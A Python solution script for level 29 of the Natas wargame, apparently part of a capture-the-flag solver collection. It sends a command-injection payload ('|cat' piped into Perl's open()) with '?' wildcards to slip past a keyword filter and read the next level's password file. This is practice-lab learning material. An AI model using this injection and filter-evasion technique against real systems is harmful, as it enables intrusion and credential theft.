import re
from src.natas.base_level import NatasLevel

class Level_29(NatasLevel):

  num = 29
  explanation = "On this level, the `file` parameter is passed unsanitized to Perl's `open()`. We inject\n     `|cat ...` to execute arbitrary commands; the `?` wildcards dodge keyword filters on the path."

  def exploit(self) -> str:

    resp = self.session.get(
        self.base_url + "/index.pl",
        params={"file": "|cat /etc/n?tas_webpass/n?tas30 "}
    )
    match = re.findall(r'[A-Za-z0-9]{32}', resp.text)[-1]

    return match
